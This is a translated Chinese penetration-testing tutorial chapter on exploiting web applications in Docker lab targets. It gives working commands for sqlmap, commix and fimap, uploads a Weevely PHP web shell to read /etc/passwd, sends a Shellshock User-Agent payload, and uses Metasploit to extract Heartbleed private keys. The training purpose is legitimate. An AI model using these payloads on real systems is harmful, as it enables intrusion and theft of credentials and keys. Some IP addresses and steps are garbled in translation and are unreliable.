# 第七章。Web 应用程序利用

在本章中，我们将涵盖以下示例：

+   使用 Burp 进行主动/被动扫描

+   使用 sqlmap 在登录页面上查找 SQL 注入

+   使用 sqlmap 在 URL 参数上查找 SQL 注入

+   使用 commix 进行自动 OS 命令注入

+   使用 weevely 进行文件上传漏洞

+   利用 Shellshock 使用 Burp

+   使用 Metasploit 利用 Heartbleed

+   使用 FIMAP 工具进行文件包含攻击（RFI/LFI）

# 介绍

Web 应用程序渗透测试是我们利用在漏洞评估期间发现的漏洞的阶段。

渗透测试的成功取决于迄今为止发现了多少信息和漏洞。我们发现的所有漏洞可能并不一定都能被利用。

Web 应用程序的利用并不取决于您使用的工具。这是一个在 Web 应用程序中发现安全问题的练习。Web 应用程序只是在 Web 上而不是在您的操作系统本地运行的软件。它旨在执行特定任务并为特定用户提供服务。利用 Web 应用程序的最佳方法是了解应用程序的内容以及它所完成的任务，并更多地关注应用程序的逻辑工作流程。Web 应用程序可以是不同类型和架构的；例如，使用 PHP/Java/.NET 和 MySQL/MSSQL/Postgress 的动态 Web 页面，或者使用 Web API 的单页面应用程序。当您了解 Web 应用程序的架构、底层技术和目的时，测试 Web 应用程序将更加全面。

然而，在本章中，我们有几个可用于 Kali Linux 的工具，可用于利用在 Web 应用程序中发现的漏洞。

### 注意

不要对不是您自己的公共网站和不在您自己的服务器上的网站运行本章中演示的工具。在这种情况下，我们设置了三个运行在 Docker 中的易受攻击的 Web 应用程序，以演示本章中的工具/技术。*小心！*

# 使用 Burp 进行主动/被动扫描

在本示例中，我们将使用 Burp Suite Pro 中的 Burp 扫描器，这是一款付费软件。它的价格约为每年 350 美元。它加载了许多功能，其中一些在免费版本中不可用或受限制。

Burp 套件的价格并不像其他网络应用程序扫描器那样昂贵，并且提供了许多功能，在网络应用程序渗透测试中非常有帮助。不涵盖这些内容将是不合适的，因为它是渗透测试人员在网络应用程序渗透测试中广泛使用的工具。话虽如此，让我们快速进入吧。

## 准备工作

要完成此示例，您需要在 Oracle Virtualbox 或 VMware 中运行 Kali Linux，并拥有 Burp Suite Pro 许可证。

## 如何做...

对于此示例，您需要执行以下步骤：

1.  打开 Firefox 并导航到**首选项** | **高级** | **网络** | **设置** | **手动代理配置**，将主机设置为`127.0.0.1`，主机端口设置为`8080`，并勾选**用于所有协议**，如下图所示：![如何做...](img/image_07_001.jpg)

1.  打开终端并从 Docker hub 拉取 Docker 容器，如果您还没有拉取 Docker 镜像，请使用以下命令：

```
    docker pull ishangirdhar/dvwabricks

    ```

您应该看到以下输出：

```
            docker pull ishangirdhar/dvwabricks
            Using default tag: latest
            latest: Pulling from ishangirdhar/dvwabricks
    8387d9ff0016: Pull complete 
    3b52deaaf0ed: Pull complete 
    4bd501fad6de: Pull complete 
    a3ed95caeb02: Pull complete 
    790f0e8363b9: Pull complete 
    11f87572ad81: Pull complete 
    341e06373981: Pull complete 
    709079cecfb8: Pull complete 
    55bf9bbb788a: Pull complete 
    b41f3cfd3d47: Pull complete 
    70789ae370c5: Pull complete 
    43f2fd9a6779: Pull complete 
    6a0b3a1558bd: Pull complete 
    934438c9af31: Pull complete 
    1cfba20318ab: Pull complete 
    de7f3e54c21c: Pull complete 
    596da16c3b16: Pull complete 
    e94007c4319f: Pull complete 
    3c013e645156: Pull complete 
    235b6bb50743: Pull complete 
    85b524a6ea7a: Pull complete 
            Digest: sha256:        ffe0a1f90c2653ca8de89d074ff39ed634dc8010d4a96a0bba14200cdf574e3
            Status: Downloaded newer image for         ishangirdhar/dvwabricks:latest

    ```

1.  使用以下命令运行下载的 Docker 镜像：

```
    docker run ishangirdhar/dvwabricks

    ```

您应该看到以下输出：

```
            docker run ishangirdhar/dvwabricks
            => An empty or uninitialized MySQL volume is detected in         /var/lib/mysql
            => Installing MySQL ...
            => Done!
            => Waiting for confirmation of MySQL service startup
            => Creating MySQL admin user with random password
            => Done!        ====================================================================
            You can now connect to this MySQL Server using:
            mysql -uadmin -pzYKhWYtlY0xF -h<host> -P<port>
            ======= snip===========
            supervisord started with pid 1
            2016-07-30 20:12:35,792 INFO spawned: 'mysqld' with pid 437
            2016-07-30 20:12:35,794 INFO spawned: 'apache2' with pid 438

    ```

1.  现在，要启动 Burp，请转到**代理**选项卡，单击**打开拦截**以关闭它，然后转到**HTTP 历史记录**选项卡，如下所示：![如何做...](img/image_07_002.jpg)![如何做...](img/image_07_003.jpg)

1.  现在，一切都设置好了，我们只需要找出运行易受攻击的 Web 应用程序的容器的 IP 地址。运行以下命令：

```
    docker ps

    ```

1.  你应该会看到以下输出：![如何操作...](img/image_07_004.jpg)

1.  复制容器 ID 并运行以下命令：

```
          docker inspect dda0a7880576 | grep -i ipaddress

    ```

1.  你应该会看到以下输出：

```
          "SecondaryIPAddresses": null,
              "IPAddress": "172.17.0.2",
                "IPAddress": "172.17.0.2",

    ```

1.  切换到 Firefox 窗口，在地址栏中输入前面的 IP 地址，你应该会看到下面截图中显示的内容：![如何操作...](img/image_07_005.jpg)

1.  点击**dvwa**，然后点击**创建/重置数据库**，如下面的截图所示：![如何操作...](img/image_07_006.jpg)

1.  你将被重定向到登录页面；输入用户名`admin`和密码`password`，这是`dvwa`的默认用户名和密码。登录后，你应该会看到以下截图：![如何操作...](img/image_07_007.jpg)

1.  遍历整个应用程序，使用不同的模块，点击所有可能的练习并尝试一次。

1.  切换到 Burp 窗口，你会看到 Burp 在**HTTP 历史**选项卡中捕获了所有请求，如下所示：![如何操作...](img/image_07_008.jpg)

1.  现在，转到目标选项卡，找到你的 IP 地址，右键点击它，然后点击**添加到范围**，如下面的截图所示：![如何操作...](img/image_07_009.jpg)

1.  然后，右键点击相同的 IP，这次点击**Spider this host**，如下面的截图所示：![如何操作...](img/image_07_010.jpg)

1.  适当地回答可能出现的弹出屏幕，并注意在**目标**选项卡中发现和列出的其他应用程序路径，如下面的截图所示：![如何操作...](img/image_07_011.jpg)

1.  现在，右键点击相同的 IP，这次点击**主动扫描此主机**，如下面的截图所示：![如何操作...](img/image_07_012.jpg)

1.  在扫描开始之前，你有几个选项可以选择和自定义；检查最后一项，即**删除具有以下扩展名的项目[20 个项目]**，如下面的截图所示：![如何操作...](img/image_07_013.jpg)

1.  转到扫描器页面；它会显示各种 URL 上运行测试的进度，如下面的截图所示：![如何操作...](img/image_07_014.jpg)

1.  现在，等待扫描完成，再次打开**目标**选项卡，你会看到检测到的不同漏洞，如下面的截图所示：![如何操作...](img/image_07_015.jpg)

## 它是如何工作的...

我们已经配置了浏览器在`127.0.0.1`的`8080`端口上使用 Burp 代理，然后使用`docker pull <image-name>`命令从 Docker hub 下载了易受攻击的 Web 应用程序。然后我们使用`docker run <image-name>`命令在 Docker 容器中启动了 Docker 镜像，并使用`docker inspect <container-id>`提取了运行容器的 IP 地址。

然后我们在浏览器中导航到相同的 IP 地址并遍历应用程序，然后我们看到 Burp 如何捕获我们通过浏览器发出的每个请求。我们在范围中添加了相同的域名，然后遍历整个应用程序以找出应用程序中所有可能的 URL。最后，我们在主机上开始了主动扫描，发现了关键的漏洞，如 SQL 注入、跨站脚本和命令注入。在接下来的几个步骤中，我们将学习如何利用这次扫描获得的知识以及如何使用特定工具来利用它们。

# 使用 sqlmap 在登录页面上查找 SQL 注入

SQL 注入在 OWASP Web 应用程序前 10 大漏洞的每一次迭代中都是前三名。它们对 Web 应用程序和企业都是最具破坏性的。发现 SQL 注入是困难的，但如果你碰巧发现了一个，手动利用它直到在服务器上获得访问权限更加困难和耗时。因此，使用自动化方法非常重要，因为在渗透测试活动中，时间总是不够用的，你总是希望尽早确认 SQL 注入的存在。

Sqlmap 是一个开源的渗透测试工具，它自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程，使用 Python 编写，并由开发人员定期维护。SQLMap 已经成为一个强大的工具，在各种参数中识别和检测 SQL 注入非常可靠。

在这个步骤中，我们将学习如何使用 sqlmap 在目标 Web 应用程序的登录页面上查找 SQL 注入漏洞。

## 准备工作

要按照这个步骤，你需要以下内容：

+   一个互联网连接

+   Kali Linux 在 Oracle Virtualbox 中运行

+   安装 Docker 的 Kali Linux

+   下载入侵-利用 Docker 镜像

## 如何操作...

对于这个步骤，你需要执行以下步骤：

1.  打开终端，输入`sqlmap`，sqlmap 将显示其正确的用法语法，如下面的屏幕截图所示：![操作步骤...](img/image_07_016.jpg)

1.  我们将使用`http://172.17.0.2/bricks/login-1/index.php`作为我们的目标。这是一个 OWASP bricks 安装：![操作步骤...](img/image_07_017.jpg)

1.  转到**Firefox 首选项** | **高级** | **网络** | **设置**，如下面的屏幕截图所示：![操作步骤...](img/image_07_018.jpg)

1.  选择**手动代理配置**，输入**HTTP 代理**为`127.0.0.1`，**代理**为`8080`，并勾选**为所有协议使用此代理**，如下面的屏幕截图所示：![操作步骤...](img/image_07_019.jpg)

1.  点击**确定**，回到**Bricks 登录**页面；如果你还没有启动 Burp Suite，就开始启动它。你可以导航到**应用程序** | **Web 应用程序分析** | **Burpsuite**，如下面的屏幕截图所示：![操作步骤...](img/image_07_020.jpg)

1.  Burp 的窗口将打开，你可以选择一个临时项目，然后点击**开始 Burp**；你的 Burp 窗口将看起来像下面的屏幕截图所示：![操作步骤...](img/image_07_021.jpg)

1.  现在打开 bricks 登录页面，输入任何字符串的用户名和密码，然后点击**提交**。不管你在用户名和密码字段中输入什么，因为我们将在 Burp 中拦截请求；一旦你点击登录页面上的**提交**按钮，你将看到 Burp 窗口，如下所示：![操作步骤...](img/image_07_022.jpg)

1.  在 Burp 窗口的任何位置右键单击，然后点击**复制到文件**菜单，如下面的屏幕截图所示：![操作步骤...](img/image_07_023.jpg)

1.  在终端上运行以下命令：

```
    sqlmap -r "./Desktop/bricks-login-request.txt" --is-dba --tables       -users

    ```

1.  `sqlmap`命令将运行其启发式检查，并显示识别的数据库为 MySQL，并询问您是否要跳过寻找其他可能的数据库；输入*Y*并按*Enter*，因为它通常是准确的，最好在服务器上生成尽可能少的请求。看一下下面的屏幕截图：![操作步骤...](img/image_07_024.jpg)

1.  一旦你按下*Enter*，它会问你是否要保留级别和风险的值。这意味着在寻找 SQL 注入时，它尽可能少地执行请求，并且应该是尽可能少风险的 SQL 语句。最好从值`1`开始，如果不起作用，再增加级别和风险到 5；现在，我们将输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](img/image_07_025.jpg)

1.  之后，sqlmap 会提示您无法使用 NULL 值进行注入，并询问您是否希望为`- -union-char`选项使用随机整数值。这个陈述很清楚，输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](img/image_07_026.jpg)

1.  sqlmap 已经确定用户名是可注入和易受攻击的；现在 sqlmap 正在询问您是否想要继续寻找其他易受攻击的参数，还是您想要开始利用已发现易受攻击的参数。通常最好查找所有易受攻击的参数，这样您就可以向开发人员报告所有需要进行输入验证的参数；现在，我们将输入*Y*并按*Enter*，如下面的屏幕截图所示：![操作步骤...](img/image_07_027.jpg)

1.  直到所有参数都被测试过才会不断提示；一旦完成，sqlmap 会提示您选择应该利用哪些参数，如下面的屏幕截图所示：![操作步骤...](img/image_07_028.jpg)

1.  您可以选择任何您喜欢的参数；作为演示，我们将选择用户名参数并输入`**0**`，然后按*Enter*，立即 sqlmap 将开始检索您在开关中提到的信息，如下面的屏幕截图所示：![操作步骤...](img/image_07_029.jpg)

正如您所看到的，sqlmap 可以将数据库表名转储出来，如下面的屏幕截图所示：

![操作步骤...](img/image_07_030.jpg)

## 工作原理...

在这个示例中，我们学习了如何使用 sqlmap 来检查登录页面上的参数是否容易受到 SQL 注入的攻击。在这个命令中，我们使用了以下开关：

+   `--url`：此开关提供了 sqlmap 的目标 URL。这是运行 sqlmap 所必需的开关。

+   `--data`：这是一个特定的开关，您需要使用它来发送 POST 数据。在我们的示例中，我们发送`wp-username`、`wp-pass`和`wp-submit`及其相应的值作为 POST 数据。

+   `-r`：此开关可以代替`--url`开关。`-r`开关加载带有 POST 数据的请求文件。`/path/to/file`。您可以通过在 Burp 上右键单击代理并将其保存到文件选项来捕获登录页面的 POST 请求以创建请求文件。

+   `--dbs`：如果发现任何参数是易受攻击和可注入的，此开关将获取所有数据库名称。

+   `--tables`：如果发现任何参数是易受攻击和可注入的，此开关将获取数据库中的所有表名。

+   `--is-dba`：此开关检查应用程序使用的数据库用户是否具有 DBA 特权。

+   `QLMAP`：用于查找 URL 参数中的 SQL 注入

# 利用 SQL 注入攻击 URL 参数

SQL 注入可能存在于应用程序的任何地方，例如登录页面、`GET`、`POST`参数、身份验证后，有时甚至存在于 cookies 本身。使用 sqlmap 与我们在上一个示例中使用它并没有太大的不同，但这个示例的目的是帮助您了解 sqlmap 也可以用于利用需要认证后才能访问的页面上的 SQL 注入。

在这个示例中，我们将看看如何使用 sqlmap 来利用已认证页面上的 SQL 注入。使用`-r`开关允许 sqlmap 在检查 URL 时使用请求中的 cookies，无论它们是否可访问。由于 sqlmap 可以处理保存的请求中的 cookies，它可以成功地识别和利用 SQL 注入。

## 准备工作

要完成本示例，您需要在 Oracle Virtualbox 中运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 操作步骤...

对于本示例，您需要执行以下步骤：

1.  我们将使用**Damn Vulnerable Web Application**（**DVWA**）托管在`http://172.17.0.2`。使用默认的 DVWA 凭据登录，然后单击左侧菜单中的**SQL 注入**。在输入框中输入`1`作为用户 ID，它将显示您的用户详细信息，并在顶部显示错误消息，如下面的屏幕截图所示：![如何操作...](img/image_07_031.jpg)

1.  上述错误消息清楚地指向潜在的 SQL 注入，我们将使用 sqlmap 来利用这个 SQL 注入，使用以下命令：

```
          sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&       Submit=Submit#" --cookie=" security=low;         PHPSESSID=eu7s6d4urudkbq8gdlgvj4jba2"

    ```

1.  运行上述命令后，sqlmap 立即确定后端数据库是 MySQL，并要求您确认是否可能跳过任何其他检查。按*Y*并继续，如下面的屏幕截图所示：![如何操作...](img/image_07_032.jpg)

1.  Sqlmap 继续验证易受攻击的参数，并要求用户输入以继续检查其他参数，如下面的屏幕截图所示：![如何操作...](img/image_07_033.jpg)

1.  按下*N*，它会显示易受攻击的参数摘要以及使用的注入类型和查询，如下面的屏幕截图所示：![如何操作...](img/image_07_034.jpg)

1.  在发现 ID 参数容易受到 SQL 注入的情况下，我们修改了原始命令以添加额外的开关，如下面的屏幕截图所示：

```
          sqlmap --url="http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&      Submit=Submit#" --cookie=" security=low;       PHPSESSID=k5c4em2sqm6j4btlm0gbs25v26" --current-db --current-user       --hostname

    ```

1.  运行上述命令后，您可以看到以下输出：![如何操作...](img/image_07_035.jpg)

1.  同样，您可以使用 sqlmap 中的其他开关继续完全接管 Web 服务器。

## 它是如何工作的...

在本教程中，我们使用 sqlmap 来利用经过身份验证的页面上的 ID 参数，并提取有关数据库、用户、当前用户、当前数据库和主机名等信息。在上述步骤中，我们使用了以下新开关：

+   `--cookie`：此开关使用 HTTP cookie 头来访问经过身份验证的资源

+   `--dbs`：此开关枚举 DBMS 数据库

+   `--users`：此开关枚举 DBMS 用户

+   `--current-user`：此开关检索 DBMS 当前用户

+   `--current-db`：此开关检索 DBMS 当前数据库

+   `--hostname`：此开关检索 DBMS 服务器主机名

使用 commix 进行自动 OS 命令注入

在本章的第一个教程中，我们使用 Burp Scanner 来发现 Web 应用程序中的各种漏洞。正如您所看到的，我们已经通过 Burp 扫描器检测到了 OS 命令注入漏洞。

现在在这个教程中，我们将学习如何使用 commix 工具，它是[comm]and [i]njection e[x]ploiter 的缩写，正如其名字所示，它是一个用于命令注入和利用的自动化工具。我们将使用 commix 来利用 Burp 扫描器识别的入口点。

## 准备工作

要完成本教程，您需要以下内容：

+   在 Oracle Virtualbox/VMware 上运行的 Kali Linux

+   Burp Scanner 的输出，如本章的第一个教程中所示

+   运行在 Docker 上的易受攻击的 Web 应用程序

+   互联网连接

## 如何操作...

对于这个教程，您需要执行以下步骤：

1.  打开 Burp 扫描器**目标**窗口，如前一篇文章所示：![如何操作...](img/image_07_036.jpg)

1.  单击 Burp Scanner 识别的命令注入漏洞，转到**请求**选项卡，并观察修改后的请求以及 Burp 接收到的响应。我们将使用 Burp 识别出的命令注入的相同入口参数，并在 commix 中使用它，如下面的屏幕截图所示：![如何操作...](img/image_07_037.jpg)

1.  现在打开终端并输入`commix`；它将在窗口中显示默认的帮助，如下面的屏幕截图所示：![如何操作...](img/image_07_038.jpg)

1.  我们将使用以下命令启动 commix：

```
          commix --url "http://172.17.0.2/dvwa/vulnerabilities/exec/"       --cookie='security=low; PHPSESSID=b69r7n5b2m7mj0vhps39s4db64'       --data='ip=INJECT_HERE&Submit=Submit' -all

    ```

1.  commix 将检测 URL 是否可达，并获取所有可能的信息，然后询问你是否要打开伪终端 Shell，如下截图所示：![如何做...](img/image_07_039.jpg)

1.  如果输入*Y*，你会看到 Shell 提示，如下所示：![如何做...](img/image_07_040.jpg)

如果你仔细观察伪随机 Shell 之前的输出，你会注意到 commix 和收集主机名、当前用户、当前用户权限和操作系统和密码文件，如下所示：

![如何做...](img/image_07_041.jpg)

1.  你可以在伪终端 Shell 中输入各种命令，并在屏幕上得到输出；例如，输入`pwd`来查看当前工作目录，输入`id`来查看当前用户权限，如下截图所示：![如何做...](img/image_07_042.jpg)

## 它是如何工作的...

在这个教程中，我们看到了如何使用 commix 进行命令注入和利用。由于我们已经确定了一个可能存在命令注入的参数，我们使用**INJECT_HERE**来帮助 commix 识别可执行查询并显示输出的易受攻击的参数。此外，我们在工具中使用了以下开关，其目的和描述如下：

+   `--url`：这个开关用于提供目标 URL

+   `--cookie`：这个开关用于向 commix 提供 cookies，如果目标 URL 在认证后面；commix 可以使用 cookies 来达到目标 URL

+   `--data`：这个开关用于提供需要发送到目标 URL 的任何`POST` body 参数，以便能够发出有效的请求

+   `--all`：这个开关用于枚举尽可能多的来自目标 OS X 命令注入的信息，使用这些信息我们可以进一步决定如何使用`netcat`在服务器上获得稳定的 Shell

# 使用 Weevely 进行文件上传漏洞

在这个教程中，我们将使用 Weevely 来利用文件上传漏洞。Weevely 是一个隐秘的 PHP Web Shell，模拟 telnet 样式的连接。当你需要创建一个 Web Shell 来利用文件上传漏洞时，它非常方便。它工作得非常好，以至于你不需要寻找任何工具或 Shell。让我们开始吧。

## 准备工作

要完成本教程，你需要在 Oracle Virtualbox 中运行 Kali Linux 并连接到互联网。不需要其他先决条件。

## 如何做...

对于这个教程，你需要执行以下步骤：

1.  打开目标应用程序的文件上传页面，如下截图所示：![如何做...](img/image_07_043.jpg)

1.  打开终端并输入`Weevely`；它将显示用法的示例语法，如下截图所示：![如何做...](img/image_07_044.jpg)

1.  现在我们需要生成一个 PHP Shell，可以使用以下命令：

```
          Weevely generate <password-to-connect> /root/weevely.php      Weevely generate uytutu765iuhkj /root/weevely.php

    ```

1.  输入`ls`，你会看到一个新文件被创建，名为`weevely.php`，因为我们的应用程序只允许上传图片，所以我们需要将这个文件重命名为`.jpg`扩展名，如下命令所示：

```
    mv weevely.php agent.php

    ```

1.  用目标应用程序的文件上传模块打开目标浏览器，点击**浏览**，并从`/root`目录中选择此文件并上传，如下截图所示：![如何做...](img/image_07_045.jpg)

1.  成功的消息显示了文件上传的路径。复制路径，打开终端并输入`weevely <Complete-path-to-uploaded-file> <password>`，如下命令所示：

```
          Weevely http://172.17.0.2/dvwa/hackable/uploads/weevely.php.jpg       yoursecretpassword

    ```

1.  Weevely 将尝试连接到上传的文件，并向你呈现它获取的有限（或受限制的）Shell，你可以在其中运行系统命令，也许可以用它来提升你的权限，如下截图所示：![如何做...](img/image_07_046.jpg)

1.  Weevely 提供的另一个很好的功能是，您可以直接从单个命令中使用系统命令。为了理解这一点，请输入`weevely help`，如下面的屏幕截图所示：![操作步骤...](img/image_07_047.jpg)

```
          Weevely http://dvwa.hackhunt.com/dvwa/hackable/uploads      /weevely.php.jpg yoursecretpass  :audit.etcpasswd

    ```

1.  运行此命令时，Weevely 将连接到后门并获取`/etc./passwd`文件，如下面的屏幕截图所示：![操作步骤...](img/image_07_048.jpg)

1.  同样，您可以检查 Weevely 提供的其余选项，并从目标服务器中提取信息。您还可以使用 Weevely 进行脚本化自动化。

## 工作原理...

在这个示例中，我们学习了如何使用 Weevely 来利用文件上传漏洞，以及如何使用它来获取稳定的 shell 以提升 root 权限，或者直接使用 Weevely 在目标服务器上运行系统命令。

# 利用 Burp 进行 Shellshock 攻击

在这个示例中，我们将使用 Burp 来利用 Shellshock（CVE-2014-6271）漏洞。如果您还没有听说过 Shellshock 漏洞，也就是 Bash 漏洞，那么它是 GNU bash 远程代码执行漏洞，可以允许攻击者获取对目标机器的访问权限。由于 Bash 被广泛使用，这个漏洞具有巨大的攻击面，并且由于这个漏洞的高严重性和易于利用性，它是 2014 年识别出的最严重的安全问题之一；因此，我们决定演示如何使用 Burp 来利用它。

## 准备工作

要完成本示例，您需要以下内容：

+   在 Oracle Virtualbox/VMware 中运行的 Kali Linux

+   在 Kali 中安装并运行 Docker

+   互联网连接

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  我们将从搜索并下载一个来自 Docker hub 的对 Shellshock 存在漏洞的容器开始，使用以下命令：

```
    docker search shellshock

    ```

您将看到以下输出：

![操作步骤...](img/image_07_049.jpg)

1.  我们将使用第一个 Docker 映像进行演示，并使用以下命令来拉取 Docker 映像：

```
          docker pull hmlio/vaas-cve-2014-6271

    ```

1.  现在，我们将使用以下命令将 Docker 映像作为容器运行：

```
    docker run hmlio/vaas-cve-2014-6271

    ```

1.  由于它是在 Kali 中运行的第二个容器，它具有`172.17.0.3`的 IP 地址；您可以使用`docker inspect <container-name>`来查找容器的 IP 地址。现在我们将打开浏览器并访问`72.17.0.3`，您将看到以下网页：![操作步骤...](img/image_07_050.jpg)

1.  由于我们已经配置了浏览器使用 Burp 代理，因此导航到**Proxy** | **HTTP history**选项卡，如下所示：![操作步骤...](img/image_07_051.jpg)

1.  现在右键单击它，然后单击**Send it to Repeater**，如下面的屏幕截图所示：![操作步骤...](img/image_07_052.jpg)

1.  转到 repeater 窗口，并将用户代理更改为以下内容：

```
          User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat       /etc/passwd;'

    ```

看一下下面的屏幕截图：

![操作步骤...](img/image_07_053.jpg)

1.  现在点击**Go**，您将在**Response**窗口中看到`passwd`文件的内容，如下面的屏幕截图所示：![操作步骤...](img/image_07_054.jpg)

这就是利用 Burp 轻松利用 shellshock 的方法。

## 工作原理...

在这个示例中，我们搜索并从 Docker hub 下载了一个容器映像，该映像对 Shellshock 存在漏洞。然后我们启动了容器，并将浏览器指向了容器的 IP 地址。我们使用 Burp 代理选择了`/cgi-bin/`请求，并将其发送到 repeater。在 repeater 窗口中，我们将`user agent`更改为 Shellshock 利用字符串，以读取`/etc/passwd`文件，并且我们得到了响应中的`passwd`文件内容。

# 使用 Metasploit 来利用 Heartbleed

在这个配方中，我们将使用 Kali Linux 中的 Metasploit 来利用 Heartbleed 漏洞。利用 Heartbleed 漏洞并不一定要使用 Metasploit。可以使用简单的 Python 脚本或简单的 Burp 插件（在免费版本中）来确定服务器/服务是否容易受到 Heartbleed 漏洞的影响。但是，我们想介绍 Metasploit exploit 和一个辅助模块，有时可能会非常有帮助。

## 准备工作

要完成这个配方，您需要以下内容：

+   Kali Linux 运行在 Oracle Virtualbox/VMware 上

+   在 Kali Linux 上运行的 Docker

+   易受攻击的 Web 应用程序 Docker 容器

+   互联网连接

## 如何做...

对于这个配方，您需要执行以下步骤：

1.  我们将通过以下命令搜索并下载一个来自 Docker hub 的易受 Shellshock 漏洞影响的容器来开始这个配方：

```
          docker search heartbleed

    ```

您将看到以下输出：

![操作步骤...](img/image_07_055.jpg)

1.  我们将使用第一个 Docker 镜像进行演示，并使用以下命令来拉取 Docker 镜像：

```
          docker pull andrewmichaelsmith/docker-heartbleed

    ```

1.  现在，我们将使用以下命令将 Docker 镜像作为容器运行：

```
          docker run andrewmichaelsmith/docker-heartbleed

    ```

1.  由于它是我们 Kali 中运行的第三个容器，它具有`172.17.0.4`的 IP 地址。您可以使用`docker inspect <container-name>`来查找您的容器的 IP 地址。我们现在将打开浏览器并访问`72.17.0.4`。您将看到以下网页：![操作步骤...](img/image_07_056.jpg)

1.  使用 VMware/Virtualbox 设置您的 bee-box 镜像，并在 Kali Linux 中打开`msfconsole`，如下所示：![操作步骤...](img/image_07_057.jpg)

1.  输入`search heartbleed`来查找 Metasploit 中可用的与 Heartbleed 相关的辅助和利用，如下所示：![操作步骤...](img/image_07_058.jpg)

1.  正如我们所看到的，有一个可用于 Heartbleed 的辅助模块。我们将继续并使用以下命令进行利用：

```
          msf > use auxiliary/scanner/ssl/openssl_heartbleed      msf auxiliary(openssl_heartbleed) >

    ```

1.  输入`show options`来查看可用选项，如下所示：![操作步骤...](img/image_07_059.jpg)

1.  您需要根据目标信息更改`rhost`和`rhost`；在我们的情况下，如下所示：

```
          msf > set rhosts 172.17.0.4
          msf > set rport 443
          msf > set action SCAN

    ```

1.  设置适当的设置后，我们将在`msf`控制台上输入`run`来运行模块，输出如下：![操作步骤...](img/image_07_060.jpg)

1.  该模块已检测到此服务器容易受到 Heartbleed 漏洞的影响。我们现在将继续并将操作从`SCAN`更改为`DUMP`，使用以下命令，如下所示：![操作步骤...](img/image_07_061.jpg)

1.  更改操作后，我们将再次运行模块，输出如下：![操作步骤...](img/image_07_062.jpg)

1.  从服务器检索的数据已经被转储到了 Metasploit 给出的目录路径上的文件中。我们将继续并将操作从`DUMP`更改为`KEYS`，并最后一次运行模块，看看我们是否可以从服务器检索任何私钥，如下所示：![操作步骤...](img/image_07_063.jpg)

1.  更改操作后，再次运行模块，看看 Metasploit 是否可以从服务器检索私钥，如下所示：![操作步骤...](img/image_07_064.jpg)

正如您所看到的，Metasploit 已成功从易受攻击的服务器中提取了私钥。

## 它是如何工作的...

在这个配方中，我们使用 Metasploit 来利用 SSL Heartbleed 漏洞进行利用，可以转储内存数据并提取服务器的私钥。

# 使用 FIMAP 工具进行文件包含攻击（RFI/LFI）

在第一个配方中，Burp Scanner 还确定了文件路径遍历漏洞。在这个配方中，我们将学习如何使用 Fimap 来利用文件路径遍历漏洞。

Fimap 是一个 Python 工具，可以帮助自动查找、准备、审计和最终利用 Web 应用程序中的本地和远程文件包含漏洞。

## 准备工作

要完成这个配方，您需要以下内容：

+   Kali Linux 运行在 Oracle Virtualbox/VMware 上

+   在 Kali Linux 上运行的 Docker

+   易受攻击的 Web 应用 Docker 容器

+   互联网连接

## 操作步骤...

对于这个示例，您需要执行以下步骤：

1.  打开浏览器，转到`http:/dvwa.hackhunt.com/dvwa`，并使用默认凭据登录。从左侧菜单中点击**文件包含**，如下面的屏幕截图所示：![操作步骤...](img/image_07_065.jpg)

1.  打开终端并输入`fimap`，将显示版本和作者信息，如下面的屏幕截图所示：![操作步骤...](img/image_07_066.jpg)

1.  要使用 Fimap 来利用 LFI/RFI 漏洞，我们需要使用以下命令：

```
          fimap -u 'http://172.17.0.2/dvwa/vulnerabilities       /fi/?page=include.php' --cookie="security=low;         PHPSESSID=b2qfpad4jelu36n6d2o5p6snl7" --enable-blind

    ```

1.  Fimap 将开始查找服务器上可以读取的本地文件，并在目标易受文件包含攻击时显示它，如下面的屏幕截图所示：![操作步骤...](img/image_07_067.jpg)

1.  最后，Fimap 将显示它能够从服务器上读取的所有文件，如下面的屏幕截图所示：![操作步骤...](img/image_07_068.jpg)

1.  现在，我们将使用之前使用的带有`-x`结尾的命令，以便继续利用此文件包含并获取服务器的 shell，如下所示：

```
          fimap -u http://dvwa.hackhunt.com/dvwa/vulnerabilities      /fi/?page=include.php        --cookie="PHPSESSID=376221ac6063449b0580c289399d89bc;      security=low" -x

    ```

1.  Fimap 将启动交互式菜单并要求输入；选择`1`，因为我们的域是`dvwa.hackhunt.com`，如下所示：![操作步骤...](img/image_07_069.jpg)

1.  在下一步中，它将要求您选择要开始的易受攻击的漏洞；对于我们的示例，我们将选择`1`，如下面的屏幕截图所示：![操作步骤...](img/image_07_070.jpg)

1.  在下一步中，它会给您两个选项。`1`是生成直接 shell，第二个是使用 pentest monkey 脚本创建反向 shell。对于我们的演示，我们将使用`1`，如下面的屏幕截图所示：![操作步骤...](img/image_07_071.jpg)

1.  如您所见，我们已成功接收到 shell，如下面的屏幕截图所示：![操作步骤...](img/image_07_072.jpg)

1.  我们可以使用此通道获取稳定的 shell，并最终提升到服务器上的 root 权限。

## 工作原理...

在这个示例中，我们使用 Fimap 来利用本地和远程文件包含，并在服务器上获取 shell 访问权限。在这个示例中，我们使用了以下开关：

+   -u：这表示目标 URL。

+   --cookie：由于我们的注入点在身份验证之后，我们必须使用此选项来设置 cookie，以便 Fimap 可以访问注入点。

+   --enable-blind：当 Fimap 无法检测到某些内容或没有出现错误消息时，此开关非常有用。请注意，此模式将导致大量请求。

+   -x：用于利用远程文件包含漏洞并自动生成 shell。
